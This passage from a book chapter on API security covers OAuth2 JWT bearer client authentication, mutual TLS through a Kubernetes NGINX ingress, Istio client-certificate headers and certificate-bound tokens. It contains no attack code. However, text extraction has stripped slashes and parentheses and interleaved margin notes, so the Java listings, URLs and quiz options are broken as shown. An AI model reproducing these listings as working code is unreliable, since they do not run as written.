Publish the JWK Set  to a HTTPS endpoint  using Spark.   The JWT bearer grant for OAuth2  393  The  Nimbus  JOSE  library  requires  the  Bouncy  Castle  cryptographic  library  to  be loaded  to  enable  JWK  Set  support,  so  add  the  following  dependency  to  the  Maven pom.xml file in the root of the Natter API project:               org.bouncycastle         bcpkix-jdk15on         1.66         You can now start the client by running the following command in the root folder of the Natter API project:  mvn clean compile exec:java \   -Dexec.mainClass=com.manning.apisecurityinaction.JwtBearerClient  In a separate terminal, you can then test that the public keys are being published by running:  curl https:  localhost:4567 jwks > jwks.txt  The result will be a JSON object containing a single keys field, which is an array of JSON Web Keys.   By default, the AS server running in Docker won’t be able to access the URI that you’ve published the keys to, so for this example you can copy the JWK Set directly into the client settings. If you’re using the ForgeRock Access Management software from appendix A, then log in to the admin console as amadmin as described in the appendix and carry out the following steps:  1 Navigate  to  the  Top  Level  Realm  and  click  on  Applications  in  the  left-hand  menu and then OAuth2.0.   2 Click on the test client you registered when installing the AS.  3 Select the Signing and Encryption tab, and then copy and paste the contents of  the jwks.txt file you just saved into the Json Web Key field.  4 Find the Token Endpoint Authentication Signing Algorithm field just above the  JWK field and change it to ES256.  5 Change the Public Key Selector field to “JWKs” to ensure the keys you just con-  figured are used.  6 Finally, scroll down and click Save Changes at the lower right of the screen.  11.3.2 Generating the JWT  A JWT used for client authentication must contain the following claims:   The sub claim is the ID of the client.  An iss claim that indicates who signed the JWT. For client authentication this is  also usually the client ID.   394  CHAPTER 11 Securing service-to-service APIs   An aud claim that lists the URI of the token endpoint of the AS as the intended  audience.   An exp claim that limits the expiry time of the JWT. An AS may reject a client authentication JWT with an unreasonably long expiry time to reduce the risk of replay attacks.  Some authorization servers also require the JWT to contain a jti claim with a unique random value in it. The AS can remember the jti value until the JWT expires to prevent replay if the JWT is intercepted. This is very unlikely because client authen- tication occurs over a direct TLS connection between the client and the AS, but the use of a jti is required by the OpenID Connect specifications, so you should add one to ensure maximum compatibility. Listing 11.3 shows how to generate a JWT in the correct format using the Nimbus JOSE+JWT library that you used in chapter 6. In this case, you’ll use the ES256 signature algorithm  ECDSA with SHA-256 , which is  widely  implemented.  Generate  a  JWT  header  indicating  the  algorithm  and  the key ID  which corresponds to the keystore alias . Populate the JWT claims set values as  just  discussed.  Finally,  sign  the  JWT  to  produce  the  assertion  value.  Open  the JwtBearerClient.java file and type in the contents of the listing at the end of the main method.  Listing 11.3 Generating a JWT client assertion  var clientId = "test"; var as = "https:  as.example.com:8080 oauth2 access_token"; var header = new JWSHeader.Builder JWSAlgorithm.ES256                .keyID "es256-key"                                           .build  ;                                            var claims = new JWTClaimsSet.Builder           .subject clientId                                    .issuer clientId                                     .expirationTime Date.from now  .plus 30, SECONDS                 .audience as                                         .jwtID UUID.randomUUID  .toString                  .build  ; var jwt = new SignedJWT header, claims ;    jwt.sign new ECDSASigner privateKey  ;      var assertion = jwt.serialize  ;             Sign the  JWT with the  private key.  Create a header with  the correct algorithm  and key ID.  Set the subject and issuer  claims to the client ID.  Set the audience  to the AS token  endpoint.  Add a short expiration time.  Add a random JWT ID claim to prevent replay.  Once you’ve registered the JWK Set with the AS, you should then be able to generate an assertion and use it to authenticate to the AS to obtain an access token. Listing 11.4 shows how to format the client credentials request with the client assertion and send it to the AS an HTTP request. The JWT assertion is passed as a new client_assertion parameter,  and  the  client_assertion_type  parameter  is  used  to  indicate  that  the assertion is a JWT by specifying the value:  urn:ietf:params:oauth:client-assertion-type:jwt-bearer   The JWT bearer grant for OAuth2  395  The encoded form parameters are then POSTed to the AS token endpoint using the Java HTTP library. Open the JwtBearerClient.java file again and add the contents of the listing to the end of the main method.  Listing 11.4 Sending the request to the AS  var form = "grant_type=client_credentials&scope=create_space" +            "&client_assertion_type=" +                                "urn:ietf:params:oauth:client-assertion-type:jwt-bearer" +                 "&client_assertion=" + assertion;                           Build the form  content with the  assertion JWT.  Create the POST request to the token endpoint.  var httpClient = HttpClient.newHttpClient  ;                           var request = HttpRequest.newBuilder                                           .uri URI.create as                                                     .header "Content-Type", "application x-www-form-urlencoded"            .POST HttpRequest.BodyPublishers.ofString form                         .build  ;                                                      var response = httpClient.send request,                    HttpResponse.BodyHandlers.ofString   ;     System.out.println response.statusCode   ; System.out.println response.body   ;  Send the request and  parse the response.  Run the following Maven command to test out the client and receive an access token from the AS:  mvn -q clean compile exec:java \   -Dexec.mainClass=com.manning.apisecurityinaction.JwtBearerClient  After the client flow completes, it will print out the access token response from the AS.  11.3.3 Service account authentication  Authenticating a service account using JWT bearer authentication works a lot like client authentication. Rather than using the client credentials grant, a new grant type named      urn:ietf:params:oauth:grant-type:jwt-bearer  is used, and the JWT is sent as the value of the assertion parameter rather than the client_assertion parameter. The following code snippet shows how to construct the form when using the JWT bearer grant type to authenticate using a service account:  Pass the JWT as the assertion parameter.  var form = "grant_type=" +                                        "urn:ietf:params:oauth:grant-type:jwt-bearer" +            "&scope=create_space&assertion=" + assertion;       Use the jwt-bearer  grant type.  The claims in the JWT are the same as those used for client authentication, with the following exceptions:   The sub claim should be the username of the service account rather than the   The iss claim may also be different from the client ID, depending on how the  client ID.  AS is configured.   396  CHAPTER 11 Securing service-to-service APIs  There is an important difference in the security properties of the two methods, and this is often reflected in how the AS is configured. When the client is using a JWT to authenticate itself, the JWT is a self-assertion of identity. If the authentication is suc- cessful, then the AS issues an access token authorized by the client itself. In the JWT bearer grant, the client is asserting that it is authorized to receive an access token on behalf of the given user, which may be a service account or a real user. Because the user is not present to consent to this authorization, the AS will usually enforce stron- ger security checks before issuing the access token. Otherwise, a client could ask for access tokens for any user it liked without the user being involved at all. For example, an AS might require separate registration of trusted JWT issuers with settings to limit which users and scopes they can authorize access tokens for.   An interesting aspect of JWT bearer authentication is that the issuer of the JWT and the client can be different parties. You’ll use this capability in section 11.5.3 to harden the security of a service environment by ensuring that pods running in Kuber- netes don’t have direct access to privileged service credentials.  Pop quiz 3 Which one of the following is the primary reason for preferring a service account  over the client credentials grant? a Client credentials are more likely to be compromised. b  It’s hard to limit the scope of a client credentials grant request. It’s harder to revoke client credentials if the account is compromised.  c d The client credentials grant uses weaker authentication than service accounts. e Clients are usually private to the AS while service accounts can live in a shared  repository.  4 Which of the following are reasons to prefer JWT bearer authentication over cli-  ent secret authentication?  There may be multiple correct answers.   a  JWTs are simpler than client secrets. JWTs can be compressed and so are smaller than client secrets. b c The AS may need to store the client secret in a recoverable form. d A JWT can have a limited expiry time, reducing the risk if it is stolen. e  JWT bearer authentication avoids sending a long-lived secret over the network.  The answers are at the end of the chapter.  11.4 Mutual TLS authentication  JWT bearer authentication is more secure than sending a client secret to the AS, but as you’ve seen in section 11.3.1, it can be significantly more complicated for the client. OAuth2 requires that  connections to the  AS  are made  using  TLS, and you can use TLS for secure client authentication as well. In a normal TLS connection, only the server presents a certificate that authenticates who it is. As explained in chapter 10,   11.4.1 How TLS certificate authentication works  Mutual TLS authentication  397  this  is  all  that  is  required  to  set  up  a  secure  channel  as  the  client  connects  to  the server, and the client needs to be assured that it has connected to the right server and not a malicious fake. But TLS also allows the client to optionally authenticate with a client certificate, allowing the server to be assured of the identity of the client and use this for access control decisions. You can use this capability to provide secure authenti- cation  of  service  clients.  When  both  sides  of  the  connection  authenticate,  this  is known as mutual TLS  mTLS .  TIP Although it was once hoped that client certificate authentication would be used for users, perhaps even replacing passwords, it is very seldom used. The complexity of managing keys and certificates makes the user experience very poor and confusing. Modern user authentication methods such as Web- Authn  https:  webauthn.guide  provide many of the same security benefits and are much easier to use.  The full details of how TLS certificate authentication works would take many chapters on its own, but a sketch of how the process works in the most common case will help you to understand the security properties provided. TLS communication is split into two phases:  1 An initial handshake, in  which  the  client  and  the  server  negotiate which cryp- tographic  algorithms  and  protocol  extensions  to  use,  optionally  authenticate each other, and agree on shared session keys.  2 An  application  data  transmission  phase  in  which  the  client  and  server  use  the shared session keys negotiated during the handshake to exchange data using symmetric authenticated encryption.2  During the handshake, the server presents its own certificate in a TLS Certificate mes- sage. Usually this is not a single certificate, but a certificate chain, as described in chap- ter 10: the server’s certificate is signed by a certificate authority  CA , and the CA’s certificate is included too. The CA may be an intermediate CA, in which case another CA also signs its certificate, and so on until at the end of the chain is a root CA that is directly trusted by the client. The root CA certificate is usually not sent as part of the chain as the client already has a copy.  RECAP A certificate contains a public key and identity information of the sub- ject the certificate was issued to and is signed by a certificate authority. A certifi- cate chain consists of the server or client certificate followed by the certificates of one or more CAs. Each certificate is signed by the CA following it in the chain until a root CA is reached that is directly trusted by the recipient.  2 There are additional sub-protocols that are used to change algorithms or keys after the initial handshake and  to signal alerts, but you don’t need to understand these.   398  CHAPTER 11 Securing service-to-service APIs  To  enable  client  certificate  authentication,  the  server  sends  a  CertificateRequest  mes- sage, which requests that the client also present a certificate, and optionally indicates which CAs it is willing to accept certificates signed by and the signature algorithms it supports. If the server doesn’t send this message, then the client certificate authentica- tion is disabled. The client then responds with its own Certificate message containing its certificate chain. The client can also ignore the certificate request, and the server can then choose whether to accept the connection or not.  NOTE The  description  in  this  section  is  of  the  TLS  1.3  handshake   simpli- fied . Earlier versions of the protocol use different messages, but the process is equivalent.  If this was all that was involved in TLS certificate authentication, it would be no differ- ent to JWT bearer authentication, and the server could take the client’s certificates and present them to other servers to impersonate the client, or vice versa. To prevent this, whenever the client or server present a Certificate message TLS requires them to also send a CertificateVerify message in which they sign a transcript of all previous mes- sages  exchanged  during  the  handshake.  This  proves  that  the  client   or  server   has control of the private key corresponding to their certificate and ensures that the sig- nature is tightly bound to this specific handshake: there are unique values exchanged in the handshake, preventing the signature being reused for any other TLS session. The session keys used for authenticated encryption after the handshake are also derived from these unique values, ensuring that this one signature during the handshake effectively authenticates  the  entire  session,  no  matter  how  much  data  is  exchanged.  Figure  11.4 shows the main messages exchanged in the TLS 1.3 handshake.  LEARN ABOUT IT We’ve only given a brief sketch of the TLS handshake pro- cess and certificate authentication.

The answers are at the end of the chapter.  The client starts the handshake by sending a ClientHello message.

ClientHello  ServerHello  CertiﬁcateRequest  Certiﬁcate  CertiﬁcateVerify  Finished  Certiﬁcate  CertiﬁcateVerify  Finished  The client then sends its certiﬁcate chain and signs the CertiﬁcateVerify message.  Application data  Figure 11.4 In the TLS handshake, the server sends its own certificate and can ask the  client for a certificate using a CertificateRequest message. The client responds with a  Certificate message containing the certificate and a CertificateVerify message proving that  it owns the associated private key.  11.4.2 Client certificate authentication  To enable TLS client certificate authentication for service clients, you need to config- ure the server to send a CertificateRequest message as part of the handshake and to vali- date  any  certificate  that  it  receives.  Most  application  servers  and  reverse  proxies   400  CHAPTER 11 Securing service-to-service APIs  support  configuration  options  for  requesting  and  validating  client  certificates,  but these vary from product to product. In this section, you’ll configure the NGINX ingress controller from chapter 10 to allow client certificates and verify that they are signed by a trusted CA.   To enable client certificate authentication in the Kubernetes ingress controller, you can add annotations to the ingress resource definition in the Natter project. Table 11.1 shows the annotations that can be used.  NOTE All annotation values must be contained in double quotes, even if they are not strings. For example, you must use  nginx.ingress.kubernetes.io  auth-tls-verify-depth: "1" to specify a maximum chain length of 1.  Table 11.1 Kubernetes NGINX ingress controller annotations for client certificate authentication  Annotation  Allowed values  Description  nginx.ingress.kubernetes.io  auth-tls-verify-client  on, off, optional,  or optional_no_ca  nginx.ingress.kubernetes.io  auth-tls-secret  nginx.ingress.kubernetes.io  auth-tls-verify-depth  The name of a Kuberne- tes secret in the form  namespace secret- name  A positive integer  nginx.ingress.kubernetes.io  auth-tls-pass-certificate- to-upstream  true or false  nginx.ingress.kubernetes.io  auth-tls-error-page  A URL  Enables or disables client certificate  authentication. If on, then a client  certificate is required. The optional  value requests a certificate and veri- fies it if the client presents one. The  optional_no_ca option prompts  the client for a certificate but doesn’t  verify it.  The secret contains the set of  trusted CAs to verify the client  certificate against.  The maximum number of intermedi- ate CA certificates allowed in the  client’s certificate chain.  If enabled, the client’s certificate  will be made available in the ssl- client-cert HTTP header to  servers behind the ingress.  If certificate authentication fails,  the client will be redirected to this  error page.  To create the secret with the trusted CA certificates to verify any client certificates, you create a generic secret passing in a PEM-encoded certificate file. You can include mul- tiple root CA certificates in the file by simply listing them one after the other. For the examples in this chapter, you can use client certificates generated by the mkcert utility that you’ve used since chapter 2. The root CA certificate for mkcert is installed into its CAROOT directory, which you can determine by running  mkcert -CAROOT   Mutual TLS authentication  401  which will produce output like the following:   Users neil Library Application Support mkcert  To import this root CA as a Kubernetes secret in the correct format, run the following command:  kubectl create secret generic ca-secret -n natter-api \   --from-file=ca.crt="$ mkcert -CAROOT  rootCA.pem"  Listing 11.5 shows an updated ingress configuration with support for optional client certificate authentication. Client verification is set to optional, so that the API can sup- port  service  clients  using  certificate  authentication  and  users  performing  password authentication. The TLS secret for the trusted CA certificates is set to natter-api  ca-secret  to  match  the  secret  you  just  created  within  the  natter-api  namespace. Finally, you can enable passing the certificate to upstream hosts so that you can extract the client identity from the certificate. Navigate to the kubernetes folder under the Natter API project and update the natter-ingress.yaml file to add the new annotations shown in bold in the following listing.  Listing 11.5 Ingress with optional client certificate authentication  apiVersion: extensions v1beta1 kind: Ingress metadata:   name: api-ingress   namespace: natter-api   annotations:     nginx.ingress.kubernetes.io upstream-vhost:          "$service_name.$namespace.svc.cluster.local:$service_port"     nginx.ingress.kubernetes.io auth-tls-verify-client: "optional"             nginx.ingress.kubernetes.io auth-tls-secret: "natter-api ca-secret"        nginx.ingress.kubernetes.io auth-tls-verify-depth: "1"                     nginx.ingress.kubernetes.io auth-tls-pass-certificate-to-upstream:             "true"                                                             spec:   tls:     - hosts:         - api.natter.local       secretName: natter-tls   rules:     - host: api.natter.local       http:         paths:           - backend:               serviceName: natter-api-service               servicePort: 4567  If you still have Minikube running from chapter 10, you can now update the ingress definition by running:  kubectl apply -f kubernetes natter-ingress.yaml  Annotations to allow optional client certificate authentication   402  CHAPTER 11 Securing service-to-service APIs  TIP If changes to the ingress controller don’t seem to be working, check the output  of  kubectl  describe  ingress  -n  natter-api  to  ensure  the  annota- tions  are  correct.  For  further  troubleshooting  tips,  check  the  official  docu- mentation at http:  mng.bz X0rG.  11.4.3 Verifying client identity  The verification performed by NGINX is limited to checking that the client provided a certificate that was signed by one of the trusted CAs, and that any constraints speci- fied in the certificates themselves are satisfied, such as the expiry time of the certifi- cate. To verify the identity of the client and apply appropriate permissions, the ingress controller sets several HTTP headers that you can use to check details of the client certificate, shown in table 11.2.  Table 11.2 HTTP headers set by NGINX  Header  ssl-client-verify  Description  Indicates whether a client certificate was presented and, if so, whether  it was verified. The possible values are NONE to indicate no certificate  was supplied, SUCCESS if a certificate was presented and is valid, or  FAILURE:  if a certificate was supplied but is invalid or not  signed by a trusted CA.  ssl-client-subject-dn  The Subject Distinguished Name  DN  field of the certificate if one was  supplied.  ssl-client-issuer-dn  The Issuer DN, which will match the Subject DN of the CA certificate.  ssl-client-cert  If auth-tls-pass-certificate-to-upstream is enabled, then  this will contain the full client certificate in URL-encoded PEM format.  Figure 11.5 shows the overall process. The NGINX ingress controller terminates the cli- ent’s TLS connection and verifies the client certificate during the TLS handshake. After the client has authenticated, the ingress controller forwards the request to the backend service and includes the verified client certificate in the ssl-client-cert header.   The mkcert utility that you’ll use for development in this chapter sets the client name that you specify as a Subject Alternative Name  SAN  extension on the certifi- cate rather than using the Subject DN field. Because NGINX doesn’t expose SAN val- ues directly in a header, you’ll need to parse the full certificate to extract it. Listing 11.5 shows  how  to  parse  the  header  supplied  by  NGINX  into  a  java.security.cert .X509Certificate  object  using  a  CertificateFactory,  from  which  you  can  then extract the client identifier from the SAN. Open the UserController.java file and add the new method from listing 11.6. You’ll also need to add the following import state- ments to the top of the file:  import java.io.ByteArrayInputStream; import java.net.URLDecoder; import java.security.cert.*;   Mutual TLS authentication  403  NGINX terminates the client TLS connection and veriﬁes the client certiﬁcate as part of the handshake.

NGINX then forwards the client certificate in the ssl- client-cert HTTP header.  Listing 11.6 Parsing a certificate  public static X509Certificate decodeCert String encodedCert  {     var pem = URLDecoder.decode encodedCert, UTF_8 ;               try  var in = new ByteArrayInputStream pem.getBytes UTF_8    {         var certFactory = CertificateFactory.getInstance "X.509" ;                return  X509Certificate  certFactory.generateCertificate in ;         } catch  Exception e  {         throw new RuntimeException e ;     } }   Parse the PEM-encoded certificate using a CertificateFactory.  Decode the URL-encoding added by NGINX.  There can be multiple SAN entries in a certificate and each entry can have a different type. Mkcert uses the DNS type, so the code looks for the first DNS SAN entry and returns that as the name. Java returns the SAN entries as a collection of two-element List  objects,  the  first  of  which  is  the  type   as  an  integer   and  the  second  is  the actual value  either a String or a byte array, depending on the type . DNS entries have type value 2. If the certificate contains a matching entry, you can set the client ID as the subject attribute on the request, just as you’ve done when authenticating users. Because the trusted CA issues client certificates, you can instruct the CA not to issue a certificate that clashes with the name of an existing user. Open the User- Controller.java file again and add the new constant and method definition from the following listing.   404  CHAPTER 11 Securing service-to-service APIs  Listing 11.7 Parsing a client certificate  private static final int DNS_TYPE = 2; void processClientCertificateAuth Request request  {     var pem = request.headers "ssl-client-cert" ;          var cert = decodeCert pem ;                            try {         if  cert.getSubjectAlternativeNames   == null  {             return;         }         for  var san : cert.getSubjectAlternativeNames    {                if   Integer  san.get 0  == DNS_TYPE  {                            var subject =  String  san.get 1 ;                 request.attribute "subject", subject ;                      return;             }         }     } catch  CertificateParsingException e  {         throw new RuntimeException e ;     } }  Extract the client  certificate from the  header and decode it.  Find the first SAN  entry with DNS type.  Set the service  account identity as  the subject of the  request.  To allow a service account to authenticate using a client certificate instead of username and password, you can add a case to the UserController authenticate method that checks  if  a  client  certificate  was  supplied.  You  should  only  trust  the  certificate  if  the ingress controller could verify it. As mentioned in table 11.2, NGINX sets the header ssl-client-verify  to  the  value  SUCCESS  if  the  certificate  was  valid  and  signed  by  a trusted CA, so you can use this to decide whether to trust the client certificate.  WARNING If a client can set their own ssl-client-verify and ssl-client- cert headers, they can bypass the certificate authentication. You should test that your ingress controller strips these headers from any incoming requests. If  your  ingress  controller  supports  using  custom  header  names,  you  can reduce  the  risk  by  adding  a  random  string  to  them,  such  as  ssl-client- cert-zOAGY18FHbAAljJV.  This  makes  it  harder  for  an  attacker  to  guess  the correct header names even if the ingress is accidentally misconfigured.  You can now enable client certificate authentication by updating the authenticate method to check for a valid client certificate and extract the subject identifier from that instead. Listing 11.8 shows the changes required. Open the UserController.java file  again,  add  the  lines  highlighted  in  bold  from  the  listing  to  the  authenticate method and save your changes.  Listing 11.8 Enabling client certificate authentication  public void authenticate Request request, Response response  {     if  "SUCCESS".equals request.headers "ssl-client-verify"    {           processClientCertificateAuth request ;                              return;                                                         }  If certificate  authentication was  successful, then  use the supplied  certificate.   Mutual TLS authentication  405      var credentials = getCredentials request ;         if  credentials == null  return;      var username = credentials[0];     var password = credentials[1];  Otherwise, use the  existing password- based authentication.      var hash = database.findOptional String.class,             "SELECT pw_hash FROM users WHERE user_id = ?", username ;      if  hash.isPresent   && SCryptUtil.check password, hash.get     {         request.attribute "subject", username ;          var groups = database.findAll String.class,             "SELECT DISTINCT group_id FROM group_members " +                    "WHERE user_id = ?", username ;         request.attribute "groups", groups ;     } }  You can now rebuild the Natter API service by running  eval $ minikube docker-env  mvn clean compile jib:dockerBuild  in the root directory of the Natter project. Then restart the Natter API and database to pick up the changes,3 by running:  kubectl rollout restart deployment \     natter-api-deployment natter-database-deployment -n natter-api  After the pods have restarted  using kubectl get pods -n natter-api to check , you can register a new service user as if it were a regular user account:  curl -H 'Content-Type: application json' \   -d '{"username":"testservice","password":"password"}' \   https:  api.natter.local users  Mini project  You still need to supply a dummy password to create the service account, and some- body could log in using that password if it’s weak. Update the UserController register- User method  and database schema  to allow the password to be missing, in which case password authentication is disabled. The GitHub repository accompanying the book has a solution in the chapter11-end branch.  3 The database must be restarted because the Natter API tries to recreate the schema on startup and will throw  an exception if it already exists.    406  CHAPTER 11 Securing service-to-service APIs  You can now use mkcert to generate a client certificate for this account, signed by the mkcert root CA that you imported as the ca-secret. Use the -client option to mkcert to generate a client certificate and specify the service account username:  mkcert -client testservice  This will generate a new certificate for client authentication in the file testservice- client.pem, with the corresponding private key in testservice-client-key.pem. You can now log in using the client certificate to obtain a session token:  curl -H 'Content-Type: application json' -d '{}' \     --key testservice-client-key.pem \                 --cert testservice-client.pem \          https:  api.natter.local sessions  Supply the certificate  with --cert.  Use the --key option to  specify the private key.  Because TLS certificate authentication effectively authenticates every request sent in the same TLS session, it can be more efficient for a client to reuse the same TLS ses- sion for many HTTP API requests. In this case, you can do without token-based authen- tication and just use the certificate.  Pop quiz 7 Which one of the following headers is used by the NGINX ingress controller to  indicate whether client certificate authentication was successful? a ssl-client-cert b ssl-client-verify c ssl-client-issuer-dn d ssl-client-subject-dn e ssl-client-naughty-or-nice  The answer is at the end of the chapter.  11.4.4 Using a service mesh  Although TLS certificate authentication is very secure, client certificates still must be generated and distributed to clients, and periodically renewed when they expire. If the  private  key  associated  with  a  certificate  might  be  compromised,  then  you  also need to have processes for handling revocation or use short-lived certificates. These are the same problems discussed in chapter 10 for server certificates, which is one of the reasons that you installed a service mesh to automate handling of TLS configura- tion within the network in section 10.3.2.    To  support  network  authorization  policies,  most  service  mesh  implementations already implement mutual TLS and distribute both server and client certificates to the service mesh proxies. Whenever an API request is made between a client and a server within the service mesh, that request is transparently upgraded to mutual TLS by the   Mutual TLS authentication  407  proxies and both ends authenticate to each other with TLS certificates. This raises the possibility of using the service mesh to authenticate service clients to the API itself. For this to work, the service mesh proxy would need to forward the client certificate details from the sidecar proxy to the underlying service as a HTTP header, just like you’ve configured the ingress controller to do. Istio supports this by default since the 1.1.0  release,  using  the  X-Forwarded-Client-Cert  header,  but  Linkerd  currently doesn’t have this feature.   Unlike NGINX, which uses separate headers for different fields extracted from the client certificate, Istio combines the fields into a single header like the following example:4  x-forwarded-client-cert: By=http:  frontend.lyft.com;Hash= ➥ 468ed33be74eee6556d90c0149c1309e9ba61d6425303443c0748a ➥ 02dd8de688;Subject="CN=Test Client,OU=Lyft,L=San ➥ Francisco,ST=CA,C=US"  The fields for a single certificate are separated by semicolons, as in the example. The valid fields are given in table 11.3.  Table 11.3 Istio X-Forwarded-Client-Cert fields  Field  By  Hash  Cert  Chain  Subject  URI  DNS  Description  The URI of the proxy that is forwarding the client details.  A hex-encoded SHA-256 hash of the full client certificate.  The client certificate in URL-encoded PEM format.  The full client certificate chain, in URL-encoded PEM format.  The Subject DN field as a double-quoted string.  Any URI-type SAN entries from the client certificate. This field may be repeated if  there are multiple entries.  Any DNS-type SAN entries. This field can be repeated if there’s more than one  matching SAN entry.  The behavior of Istio when setting this header is not configurable and depends on the version of Istio being used. The latest version sets the By, Hash, Subject, URI, and DNS fields when they are present in the client certificate used by the Istio sidecar proxy for mTLS.  Istio’s  own  certificates  use  a  URI  SAN  entry  to  identify  clients  and  servers, using a standard called SPIFFE  Secure Production Identity Framework for Everyone , which  provides  a  way  to  name  services  in  microservices  environments.  Figure  11.6 shows the components of a SPIFFE identifier, which consists of a trust domain and a  4 The Istio sidecar proxy is based on Envoy, which is developed by Lyft, in case you’re wondering about the  examples!   408  CHAPTER 11 Securing service-to-service APIs  Workload identiﬁer  spiffe:  k8s.example.com ns natter-api sa natter-db  Trust domain  Namespace  Service account  Figure 11.6 A SPIFFE identifier  consists of a trust domain and  a workload identifier.

In Istio, the workload identifier consists of the Kubernetes namespace and ser- vice  account.  SPIFFE  allows  Kubernetes  services  to  be  given  stable  IDs  that  can  be included in a certificate without having to publish DNS entries for each one; Istio can use its knowledge of Kubernetes metadata to ensure that the SPIFFE ID matches the service a client is connecting to.  DEFINITION SPIFFE stands for Secure Production Identity Framework for Everyone and is a standard URI for identifying services and workloads running in a clus- ter. See https:  spiffe.io for more information.  Istio identities are based on Kubernetes service accounts, which are dis- NOTE tinct from services. By default, there is only a single service account in each namespace,  shared  by  all  pods  in  that  namespace.  See  http:  mng.bz yrJG for instructions on how to create separate service accounts and associate them with your pods.  Istio also has its own version of Kubernetes’ ingress controller, in the form of the Istio Gateway. The gateway allows external traffic into the service mesh and can also be con- figured  to  process  egress  traffic  leaving  the  service  mesh.5  The  gateway  can  also  be configured to accept TLS client certificates from external clients, in which case it will also set the X-Forwarded-Client-Cert header  and strip it from any incoming requests . The gateway sets the same fields as the Istio sidecar proxies, but also sets the Cert field with the full encoded certificate.   Because a request may pass through multiple Istio sidecar proxies as it is being pro- cessed, there may be more than one client certificate involved. For example, an exter- nal client might make a HTTPS request to the Istio Gateway using a client certificate, and this request then gets forwarded to a microservice over Istio mTLS. In this case, the  Istio  sidecar  proxy’s  certificate  would  overwrite  the  certificate  presented  by  the real client and the microservice would only ever see the identity of the gateway in the  X-Forwarded-Client-Cert  header.  To  solve  this  problem,  Istio  sidecar  proxies don’t replace the header but instead append the new certificate details to the existing header, separated by a comma. The microservice would then see a header with multi- ple certificate details in it, as in the following example:  5 The Istio Gateway is not just a Kubernetes ingress controller. An Istio service mesh may involve only part of a Kubernetes cluster, or may span multiple Kubernetes clusters, while a Kubernetes ingress controller always deals with external traffic coming into a single cluster.   11.4.5 Mutual TLS with OAuth2  Mutual TLS authentication  409  X-Forwarded-Client-Cert: By=https:  gateway.example.org; ➥ Hash=0d352f0688d3a686e56a72852a217ae461a594ef22e54cb ➥ 551af5ca6d70951bc,By=spiffe:  api.natter.local ns         ➥ natter-api sa natter-api-service;Hash=b26f1f3a5408f7 ➥ 61753f3c3136b472f35563e6dc32fefd1ef97d267c43bcfdd1  The comma  separates the two  certificate entries.  The original client certificate presented to the gateway is the first entry in the header, and  the  certificate  presented  by  the  Istio  sidecar  proxy  is  the  second.  The  gateway itself will strip any existing header from incoming requests, so the append behavior is only for internal sidecar proxies. The sidecar proxies also strip the header from new outgoing requests that originate inside the service mesh. These features allow you to use client certificate authentication in Istio without needing to generate or manage your own certificates. Within the service mesh, this is entirely managed by Istio, while external clients can be issued with certificates using an external CA.  OAuth2 can also support mTLS for client authentication through a new specification  RFC  8705 https:  tools.ietf.org html rfc8705 ,  which  also  adds  support  for  certifi- cate-bound access tokens, discussed in section 11.4.6. When used for client authenti- cation, there are two modes that can be used:   In self-signed certificate authentication, the client registers a certificate with the AS that is signed by its own private key and not by a CA. The client authenti- cates to the token endpoint with its client certificate and the AS checks that it exactly matches the certificate stored on the client’s profile. To allow the certifi- cate to be updated, the AS can retrieve the certificate as the x5c claim on a JWK from a HTTPS URL registered for the client.   In the PKI  public key infrastructure  method, the AS establishes trust in the client’s certificate through one or more trusted CA certificates. This allows the client’s certificate to be issued and reissued independently without needing to update the AS. The client identity is matched to the certificate either through the Subject DN or SAN fields in the certificate.  Unlike JWT bearer authentication, there is no way to use mTLS to obtain an access token for a service account, but a client can get an access token using the client cre- dentials grant. For example, the following curl command can be used to obtain an access token from an AS that supports mTLS client authentication:  Specify the client_id explicitly.  curl -d 'grant_type=client_credentials&scope=create_space' \     -d 'client_id=test' \         --cert test-client.pem \                     --key test-client-key.pem \                  https:  as.example.org oauth2 access_token  Authenticate using the client  certificate and private key.  The client_id parameter must be explicitly specified when using mTLS client authen- tication, so that the AS can determine the valid certificates for that client if using the self-signed method.   410  CHAPTER 11 Securing service-to-service APIs   Alternatively, the client can use mTLS client authentication in combination with the  JWT  Bearer  grant  type  of  section  11.3.2  to  obtain  an  access  token  for  a  service account while authenticating itself using the client certificate, as in the following curl example, which assumes that the JWT assertion has already been created and signed in the variable $JWT:  curl \   -d 'grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer' \       -d "assertion=$JWT&scope=a+b+c&client_id=test" \                  Authenticate the    --cert test-client.pem \                         client using mTLS.   --key test-client-key.pem \                        https:  as.example.org oauth2 access_token  Authorize using a JWT bearer for the service account.  The combination of mTLS and JWT bearer authentication is very powerful, as you’ll see later in section 11.5.3.  11.4.6 Certificate-bound access tokens  Beyond supporting client authentication, the OAuth2 mTLS specification also describes how the AS can optionally bind an access token the TLS client certificate when it is issued,  creating  a  certificate-bound  access  token.  The  access  token  then  can  be  used  to access an API only when the client authenticates to the API using the same client cer- tificate and private key. This makes the access token no longer a simple bearer token because an attacker that steals the token can’t use it without the associated private key  which never leaves the client .  DEFINITION A certificate-bound access token can’t be used except over a TLS con- nection  that  has  been  authenticated  with  the  same  client  certificate  used when the access token was issued.  Proof-of-possession tokens Certificate-bound access tokens are an example of proof-of-possession  PoP  tokens, also known as holder-of-key tokens, in which the token can’t be used unless the client proves possession of an associated secret key. OAuth 1 supported PoP tokens using HMAC request signing, but the complexity of implementing this correctly was a factor in the feature being dropped in the initial version of OAuth2. Several attempts have been made to revive the idea, but so far, certificate-bound tokens are the only pro- posal to have become a standard.  Although certificate-bound access tokens are great when you have a working PKI, they can be difficult to deploy in some cases. They work poorly in single-page apps and other web applications. Alternative PoP schemes are being discussed, such as a JWT- based scheme known as DPoP  https:  tools.ietf.org html draft-fett-oauth-dpop-03 , but these are yet to achieve widespread adoption.  To  obtain  a  certificate-bound  access  token,  the  client  simply  authenticates  to  the token endpoint with the client certificate when obtaining an access token. If the AS   Mutual TLS authentication  411  supports the feature, then it will associate a SHA-256 hash of the client certificate with the access token. The API receiving an access token from a client can check for a cer- tificate binding in one of two ways:   If using the token introspection endpoint  section 7.4.1 of chapter 7 , the AS will return a new field of the form "cnf": { "x5tS256": "…hash…" } where the hash is the Base64url-encoded certificate hash. The cnf claim communicates a confirmation key, and the x5tS256 part is the confirmation method being used.   If the token is a JWT, then the same information will be included in the JWT  claims set as a "cnf" claim with the same format.  DEFINITION A  confirmation  key  communicates  to  the  API  how  it  can  verify  a constraint on who can use an access token. The client must confirm that it has access  to  the  corresponding  private  key  using  the  indicated  confirmation method. For certificate-bound access tokens, the confirmation key is a SHA-256 hash of the client certificate and the client confirms possession of the private key by authenticating TLS connections to the API with the same certificate.  Figure  11.7  shows  